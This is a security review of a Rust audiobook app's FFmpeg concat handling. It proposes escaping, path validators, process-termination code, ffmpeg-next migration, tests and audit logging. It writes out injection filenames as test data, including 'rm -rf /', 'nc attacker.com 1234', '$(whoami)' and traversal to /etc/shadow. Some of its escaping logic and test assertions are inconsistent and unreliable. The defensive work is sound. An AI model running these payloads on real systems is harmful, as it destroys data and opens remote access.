# Security Analysis: Audio Processing Pipeline

## Executive Summary

This document analyzes security vulnerabilities in the audiobook processing codebase and provides remediation strategies. The analysis identifies critical security issues in command injection, shell escaping, process management, and resource cleanup, along with proposed type-safe alternatives.

## Critical Security Vulnerabilities

### 1. Command Injection Risks in Path Handling

#### Current Implementation Issues

**Location**: `src-tauri/src/ffmpeg/command.rs` (lines 141-145)
```rust
// VULNERABLE CODE
let path_str = input.to_str()
    .ok_or_else(|| FFmpegError::ExecutionFailed(
        "Invalid UTF-8 in file path".to_string()
    ))?;
concat_list.push_str(&format!("file '{path_str}'\n"));
```

**Vulnerability**: Direct string interpolation of file paths into shell commands without proper escaping. Malicious file names containing single quotes or shell metacharacters can break out of the quoted context.

**Attack Vector Example**:
```bash
# Malicious filename
file'; rm -rf /; echo '.mp3

# Results in concat list:
file 'file'; rm -rf /; echo '.mp3'
```

#### Remediation Strategy

1. **Immediate Fix**: Implement proper shell escaping
```rust
fn escape_ffmpeg_path(path: &str) -> String {
    // Escape single quotes by replacing ' with '\''
    path.replace('\'', "'\\''")
        .replace('\n', "")  // Remove newlines
        .replace('\r', "")  // Remove carriage returns
        .replace(';', "\\;") // Escape semicolons
        .replace('|', "\\|") // Escape pipes
        .replace('&', "\\&") // Escape ampersands
        .replace('$', "\\$") // Escape dollar signs
        .replace('`', "\\`") // Escape backticks
}
```

2. **Long-term Solution**: Use ffmpeg-next for type-safe FFmpeg bindings (see Section 5)

### 2. Shell Escaping Issues in Concat File Generation

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/processor.rs` (lines 212-213)
```rust
// VULNERABLE CODE
let escaped_path = file.path.to_string_lossy().replace('\'', "'\"'\"'");
content.push_str(&format!("file '{escaped_path}'\n"));
```

**Vulnerability**: Incomplete escaping that only handles single quotes. Does not account for:
- Newline injection (`\n`)
- Path traversal (`../`)
- Shell command separators (`;`, `|`, `&`)
- Variable expansion (`$`)
- Command substitution (`` ` ``, `$()`)

**Attack Scenarios**:
1. **Newline Injection**: 
   ```
   audio.mp3\nfile '/etc/passwd
   ```
2. **Path Traversal**: 
   ```
   ../../../../../../etc/shadow.mp3
   ```

#### Remediation Strategy

1. **Input Validation**: Validate paths before processing
```rust
fn validate_safe_path(path: &Path) -> Result<()> {
    // Check for path traversal attempts
    let canonical = path.canonicalize()
        .map_err(|_| AppError::FileValidation("Invalid path".to_string()))?;
    
    // Ensure path is within expected directory
    if !canonical.starts_with(&allowed_base_path) {
        return Err(AppError::FileValidation("Path traversal detected".to_string()));
    }
    
    // Check for suspicious characters in filename
    if let Some(name) = path.file_name() {
        let name_str = name.to_string_lossy();
        if name_str.contains('\n') || name_str.contains('\r') || 
           name_str.contains('\0') || name_str.contains("..") {
            return Err(AppError::FileValidation("Invalid characters in filename".to_string()));
        }
    }
    
    Ok(())
}
```

2. **Use Temporary Files with Safe Names**: Generate concat files with UUIDs
```rust
use uuid::Uuid;

fn create_safe_concat_file(files: &[AudioFile], temp_dir: &Path) -> Result<PathBuf> {
    let safe_filename = format!("concat_{}.txt", Uuid::new_v4());
    let concat_file = temp_dir.join(safe_filename);
    
    // Write using absolute paths with validation
    let mut content = String::new();
    for file in files {
        validate_safe_path(&file.path)?;
        let absolute_path = file.path.canonicalize()?;
        // Use FFmpeg's safe mode with absolute paths
        content.push_str(&format!("file '{}'\n", 
            escape_ffmpeg_path(&absolute_path.to_string_lossy())));
    }
    
    std::fs::write(&concat_file, content)?;
    Ok(concat_file)
}
```

### 3. Process Termination Race Conditions

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/progress_monitor.rs` (lines 141-153)
```rust
// RACE CONDITION
let _ = child.kill();

// Wait for process to actually terminate
for i in 0..PROCESS_TERMINATION_MAX_ATTEMPTS {
    if let Ok(Some(_)) = child.try_wait() {
        log::debug!("FFmpeg process terminated successfully");
        break;
    }
    std::thread::sleep(std::time::Duration::from_millis(PROCESS_TERMINATION_CHECK_DELAY_MS));
}
```

**Vulnerabilities**:
1. **Kill Signal Ignored**: No fallback if SIGTERM is ignored
2. **Resource Leak**: Process may continue running if termination fails
3. **Zombie Processes**: Improper cleanup can leave zombie processes

#### Remediation Strategy

1. **Implement Graceful Shutdown with Escalation**:
```rust
use std::time::{Duration, Instant};
use nix::sys::signal::{self, Signal};
use nix::unistd::Pid;

async fn terminate_process_safely(child: &mut Child) -> Result<()> {
    let pid = Pid::from_raw(child.id() as i32);
    let start = Instant::now();
    
    // Step 1: Try SIGTERM (graceful)
    signal::kill(pid, Signal::SIGTERM)?;
    
    // Wait up to 5 seconds for graceful shutdown
    while start.elapsed() < Duration::from_secs(5) {
        if let Ok(Some(status)) = child.try_wait() {
            log::info!("Process terminated gracefully: {:?}", status);
            return Ok(());
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    // Step 2: Send SIGKILL (forceful)
    log::warn!("Process didn't respond to SIGTERM, sending SIGKILL");
    signal::kill(pid, Signal::SIGKILL)?;
    
    // Wait up to 2 seconds for forced termination
    let kill_start = Instant::now();
    while kill_start.elapsed() < Duration::from_secs(2) {
        if let Ok(Some(status)) = child.try_wait() {
            log::info!("Process force-terminated: {:?}", status);
            return Ok(());
        }
        tokio::time::sleep(Duration::from_millis(100)).await;
    }
    
    Err(AppError::General("Failed to terminate process".to_string()))
}
```

2. **Use ProcessGuard with Proper RAII**:
```rust
impl Drop for ProcessGuard {
    fn drop(&mut self) {
        if let Ok(mut lock) = self.process.lock() {
            if let Some(mut child) = lock.take() {
                // Use tokio runtime for async termination
                let handle = tokio::runtime::Handle::try_current();
                if let Ok(handle) = handle {
                    let _ = handle.block_on(terminate_process_safely(&mut child));
                } else {
                    // Fallback to sync termination
                    let _ = child.kill();
                    let _ = child.wait();
                }
            }
        }
    }
}
```

### 4. Resource Cleanup Vulnerabilities

#### Current Implementation Issues

**Location**: `src-tauri/src/audio/cleanup.rs`
- No atomic cleanup operations
- Potential for partial cleanup on failure
- Race conditions between concurrent cleanup attempts

**Vulnerabilities**:
1. **Partial State**: Cleanup may leave system in inconsistent state
2. **Double-Free**: Multiple cleanup attempts on same resource
3. **Permission Errors**: No handling of permission-denied scenarios

#### Remediation Strategy

1. **Implement Atomic Cleanup Operations**:
```rust
use std::sync::atomic::{AtomicBool, Ordering};

pub struct AtomicCleanupGuard {
    paths: HashSet<PathBuf>,
    session_id: String,
    cleaned: AtomicBool,
    cleanup_mutex: Mutex<()>,
}

impl AtomicCleanupGuard {
    pub fn cleanup_now(&mut self) -> Result<()> {
        // Ensure single cleanup execution
        let _lock = self.cleanup_mutex.lock()
            .map_err(|_| AppError::General("Cleanup lock poisoned".to_string()))?;
        
        // Check and set atomic flag
        if self.cleaned.compare_exchange(false, true, 
            Ordering::SeqCst, Ordering::SeqCst).is_err() {
            log::debug!("Cleanup already performed for session {}", self.session_id);
            return Ok(());
        }
        
        // Perform cleanup with rollback on failure
        let mut cleaned_paths = Vec::new();
        let mut first_error = None;
        
        for path in &self.paths {
            match self.cleanup_single_path_safe(path) {
                Ok(()) => cleaned_paths.push(path.clone()),
                Err(e) => {
                    log::error!("Cleanup failed for {}: {}", path.display(), e);
                    first_error = Some(e);
                    break; // Stop on first error
                }
            }
        }
        
        // Rollback on error (best effort)
        if first_error.is_some() {
            for path in cleaned_paths {
                self.paths.insert(path); // Re-add for retry
            }
            self.cleaned.store(false, Ordering::SeqCst);
        }
        
        first_error.map_or(Ok(()), Err)
    }
    
    fn cleanup_single_path_safe(&self, path: &Path) -> Result<()> {
        // Use atomic rename before delete for safety
        let trash_dir = std::env::temp_dir().join(".audiobook_trash").join(&self.session_id);
        std::fs::create_dir_all(&trash_dir)?;
        
        let trash_path = trash_dir.join(Uuid::new_v4().to_string());
        std::fs::rename(path, &trash_path)?;
        
        // Async cleanup of trash
        tokio::spawn(async move {
            tokio::time::sleep(Duration::from_secs(5)).await;
            let _ = tokio::fs::remove_dir_all(trash_path).await;
        });
        
        Ok(())
    }
}
```

## 5. Proposed Type-Safe Alternative: ffmpeg-next

### Benefits of ffmpeg-next

1. **Type Safety**: No string concatenation or shell command building
2. **Memory Safety**: Rust's ownership system prevents buffer overflows
3. **No Shell Injection**: Direct FFmpeg library calls bypass shell entirely
4. **Better Error Handling**: Structured errors instead of string parsing

### Implementation Example

```rust
use ffmpeg_next as ffmpeg;
use ffmpeg::{format, codec, frame, Packet};

pub struct SafeMediaProcessor {
    session_id: String,
}

impl SafeMediaProcessor {
    pub fn merge_audio_files(&self, 
        input_files: Vec<PathBuf>, 
        output_path: &Path,
        settings: &AudioSettings
    ) -> Result<()> {
        ffmpeg::init()?;
        
        // Open output context
        let mut output = format::output(output_path)?;
        
        // Configure output format
        let mut output_stream = output.add_stream(codec::id::Id::AAC)?;
        let context = output_stream.codec();
        context.set_bit_rate(settings.bitrate * 1000);
        context.set_sample_rate(settings.sample_rate);
        context.set_channels(settings.channels as i32);
        context.set_channel_layout(codec::channel_layout::STEREO);
        
        // Process input files safely
        for input_path in input_files {
            // Validate path before processing
            validate_safe_path(&input_path)?;
            
            let mut input = format::input(&input_path)?;
            
            // Copy packets safely
            for (stream, packet) in input.packets() {
                if stream.index() == 0 { // Audio stream
                    output.write_packet(&packet)?;
                }
            }
        }
        
        output.write_trailer()?;
        Ok(())
    }
}
```

### Migration Strategy

1. **Phase 1**: Add ffmpeg-next to Cargo.toml
```toml
[dependencies]
ffmpeg-next = "7.0"
ffmpeg-sys-next = "7.0"
```

2. **Phase 2**: Create safe wrapper module
```rust
mod safe_ffmpeg {
    use ffmpeg_next as ffmpeg;
    
    pub struct SafeProcessor {
        // Implementation
    }
    
    pub trait MediaProcessor {
        fn process(&self, plan: MediaProcessingPlan) -> Result<()>;
    }
}
```

3. **Phase 3**: Gradual migration with feature flags
```rust
#[cfg(feature = "safe-ffmpeg")]
use safe_ffmpeg::SafeProcessor;

#[cfg(not(feature = "safe-ffmpeg"))]
use legacy_ffmpeg::CommandProcessor;
```

## 6. Input Validation Improvements

### Comprehensive Validation Framework

```rust
use std::path::{Path, PathBuf};
use regex::Regex;

pub struct PathValidator {
    allowed_extensions: Vec<String>,
    max_path_length: usize,
    forbidden_patterns: Vec<Regex>,
}

impl PathValidator {
    pub fn new() -> Self {
        Self {
            allowed_extensions: vec![
                "mp3".to_string(), 
                "m4a".to_string(), 
                "m4b".to_string(),
                "aac".to_string(),
                "flac".to_string(),
                "ogg".to_string(),
            ],
            max_path_length: 4096,
            forbidden_patterns: vec![
                Regex::new(r"\.\./").unwrap(),  // Path traversal
                Regex::new(r"^\s*\|").unwrap(),  // Pipe at start
                Regex::new(r";\s*$").unwrap(),   // Semicolon at end
                Regex::new(r"\$\{").unwrap(),    // Variable expansion
                Regex::new(r"`").unwrap(),       // Command substitution
                Regex::new(r"\x00").unwrap(),    // Null bytes
            ],
        }
    }
    
    pub fn validate_path(&self, path: &Path) -> Result<()> {
        // Check path length
        let path_str = path.to_string_lossy();
        if path_str.len() > self.max_path_length {
            return Err(AppError::FileValidation(
                format!("Path too long: {} chars", path_str.len())
            ));
        }
        
        // Check for forbidden patterns
        for pattern in &self.forbidden_patterns {
            if pattern.is_match(&path_str) {
                return Err(AppError::FileValidation(
                    "Path contains forbidden characters".to_string()
                ));
            }
        }
        
        // Validate extension
        if let Some(ext) = path.extension() {
            let ext_str = ext.to_string_lossy().to_lowercase();
            if !self.allowed_extensions.contains(&ext_str) {
                return Err(AppError::FileValidation(
                    format!("Unsupported file type: .{}", ext_str)
                ));
            }
        } else {
            return Err(AppError::FileValidation(
                "File has no extension".to_string()
            ));
        }
        
        // Ensure file exists and is readable
        if !path.exists() {
            return Err(AppError::FileValidation(
                format!("File not found: {}", path.display())
            ));
        }
        
        // Check file permissions
        let metadata = std::fs::metadata(path)
            .map_err(|e| AppError::FileValidation(
                format!("Cannot read file metadata: {}", e)
            ))?;
        
        if !metadata.is_file() {
            return Err(AppError::FileValidation(
                "Path is not a regular file".to_string()
            ));
        }
        
        // Canonicalize to prevent symlink attacks
        let canonical = path.canonicalize()
            .map_err(|e| AppError::FileValidation(
                format!("Cannot canonicalize path: {}", e)
            ))?;
        
        // Additional check: ensure canonical path is still valid
        self.validate_canonical_path(&canonical)?;
        
        Ok(())
    }
    
    fn validate_canonical_path(&self, path: &Path) -> Result<()> {
        // Ensure canonicalized path doesn't escape to system directories
        let path_str = path.to_string_lossy();
        let forbidden_prefixes = [
            "/etc", "/sys", "/proc", "/dev", 
            "/boot", "/root", "C:\\Windows", "C:\\System"
        ];
        
        for prefix in &forbidden_prefixes {
            if path_str.starts_with(prefix) {
                return Err(AppError::FileValidation(
                    format!("Access to system directory denied: {}", prefix)
                ));
            }
        }
        
        Ok(())
    }
}
```

### Settings Validation

```rust
impl AudioSettings {
    pub fn validate(&self) -> Result<()> {
        // Validate bitrate
        const VALID_BITRATES: [u32; 9] = [32, 64, 96, 128, 192, 256, 320, 384, 512];
        if !VALID_BITRATES.contains(&self.bitrate) {
            return Err(AppError::InvalidInput(
                format!("Invalid bitrate: {}. Must be one of: {:?}", 
                    self.bitrate, VALID_BITRATES)
            ));
        }
        
        // Validate sample rate
        const VALID_SAMPLE_RATES: [u32; 7] = [8000, 16000, 22050, 44100, 48000, 88200, 96000];
        match &self.sample_rate {
            SampleRateConfig::Explicit(rate) => {
                if !VALID_SAMPLE_RATES.contains(rate) {
                    return Err(AppError::InvalidInput(
                        format!("Invalid sample rate: {}Hz", rate)
                    ));
                }
            }
            SampleRateConfig::Auto => {} // Auto is always valid
        }
        
        // Validate output path
        if let Some(parent) = self.output_path.parent() {
            if !parent.exists() {
                return Err(AppError::InvalidInput(
                    "Output directory does not exist".to_string()
                ));
            }
            
            // Check write permissions
            let test_file = parent.join(format!(".audiobook_test_{}", Uuid::new_v4()));
            match std::fs::write(&test_file, b"test") {
                Ok(_) => {
                    let _ = std::fs::remove_file(test_file);
                }
                Err(_) => {
                    return Err(AppError::InvalidInput(
                        "No write permission in output directory".to_string()
                    ));
                }
            }
        }
        
        Ok(())
    }
}
```

## 7. Security Best Practices Checklist

### Immediate Actions Required

- [ ] Replace all string concatenation for shell commands with proper escaping
- [ ] Implement path validation before any file operations
- [ ] Add timeout mechanisms to all process operations
- [ ] Use atomic operations for all cleanup tasks
- [ ] Implement proper RAII guards for all resources

### Short-term Improvements (1-2 weeks)

- [ ] Add input sanitization layer for all user inputs
- [ ] Implement comprehensive logging for security events
- [ ] Add rate limiting for processing operations
- [ ] Create security test suite with fuzzing
- [ ] Document all security assumptions

### Long-term Goals (1-3 months)

- [ ] Migrate to ffmpeg-next for type-safe operations
- [ ] Implement sandboxing for FFmpeg processes
- [ ] Add cryptographic signatures for processed files
- [ ] Create security audit trail system
- [ ] Implement principle of least privilege

## 8. Testing Security Improvements

### Unit Tests for Security Functions

```rust
#[cfg(test)]
mod security_tests {
    use super::*;
    
    #[test]
    fn test_path_traversal_detection() {
        let validator = PathValidator::new();
        
        let malicious_paths = vec![
            Path::new("../../../etc/passwd"),
            Path::new("audio/../../../system.mp3"),
            Path::new("./../../sensitive.mp3"),
        ];
        
        for path in malicious_paths {
            assert!(validator.validate_path(path).is_err());
        }
    }
    
    #[test]
    fn test_command_injection_prevention() {
        let malicious_inputs = vec![
            "file'; rm -rf /; echo '.mp3",
            "audio$(whoami).mp3",
            "test`id`.mp3",
            "file\nfile /etc/passwd\n.mp3",
            "audio|nc attacker.com 1234.mp3",
        ];
        
        for input in malicious_inputs {
            let escaped = escape_ffmpeg_path(input);
            assert!(!escaped.contains('\'') || escaped.contains("\\'"));
            assert!(!escaped.contains('\n'));
            assert!(!escaped.contains('`'));
            assert!(!escaped.contains('$'));
        }
    }
    
    #[test]
    fn test_process_termination_safety() {
        use std::process::Command;
        
        let mut child = Command::new("sleep")
            .arg("60")
            .spawn()
            .unwrap();
        
        let guard = ProcessGuard::new(
            child, 
            "test-session".to_string(), 
            "test process".to_string()
        );
        
        let result = guard.terminate();
        assert!(result.is_ok());
        
        // Verify process is terminated
        let handle = guard.process_handle();
        let lock = handle.lock().unwrap();
        assert!(lock.is_none());
    }
}
```

### Fuzzing Tests

```rust
#[cfg(test)]
mod fuzz_tests {
    use quickcheck::quickcheck;
    
    quickcheck! {
        fn prop_no_shell_injection(input: String) -> bool {
            let escaped = escape_ffmpeg_path(&input);
            // Verify no unescaped shell metacharacters
            !escaped.contains("';") && 
            !escaped.contains("'|") &&
            !escaped.contains("'&") &&
            !escaped.contains("'$") &&
            !escaped.contains("'`")
        }
        
        fn prop_path_validation_consistent(path: String) -> bool {
            let validator = PathValidator::new();
            let path_buf = PathBuf::from(path);
            
            // Validation should be deterministic
            let result1 = validator.validate_path(&path_buf);
            let result2 = validator.validate_path(&path_buf);
            
            result1.is_ok() == result2.is_ok()
        }
    }
}
```

## 9. Security Monitoring and Logging

### Implement Security Event Logging

```rust
use log::{info, warn, error};
use serde::{Serialize, Deserialize};

#[derive(Debug, Serialize, Deserialize)]
pub struct SecurityEvent {
    timestamp: chrono::DateTime<chrono::Utc>,
    session_id: String,
    event_type: SecurityEventType,
    details: String,
    severity: Severity,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum SecurityEventType {
    PathTraversalAttempt,
    InvalidCharactersInPath,
    ProcessTerminationFailure,
    ResourceCleanupFailure,
    CommandInjectionAttempt,
    UnauthorizedFileAccess,
}

#[derive(Debug, Serialize, Deserialize)]
pub enum Severity {
    Low,
    Medium,
    High,
    Critical,
}

pub struct SecurityLogger {
    events: Mutex<Vec<SecurityEvent>>,
}

impl SecurityLogger {
    pub fn log_event(&self, event: SecurityEvent) {
        match event.severity {
            Severity::Critical | Severity::High => {
                error!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
            Severity::Medium => {
                warn!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
            Severity::Low => {
                info!("SECURITY: {:?} - {}", event.event_type, event.details);
            }
        }
        
        // Store for audit trail
        if let Ok(mut events) = self.events.lock() {
            events.push(event);
        }
    }
    
    pub fn export_audit_log(&self) -> Result<String> {
        let events = self.events.lock()
            .map_err(|_| AppError::General("Failed to access audit log".to_string()))?;
        
        serde_json::to_string_pretty(&*events)
            .map_err(|e| AppError::General(format!("Failed to serialize audit log: {}", e)))
    }
}
```

## 10. Conclusion

The current implementation has several critical security vulnerabilities that need immediate attention. The most pressing issues are:

1. **Command injection vulnerabilities** in path handling
2. **Incomplete shell escaping** in concat file generation
3. **Race conditions** in process termination
4. **Unreliable resource cleanup**

The recommended approach is to:
1. Apply immediate security patches using the remediation code provided
2. Implement comprehensive input validation
3. Begin migration to ffmpeg-next for type-safe operations
4. Establish security testing and monitoring practices

These improvements will significantly enhance the security posture of the audiobook processing system while maintaining functionality and performance.

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
- [FFmpeg Security Considerations](https://ffmpeg.org/security.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)
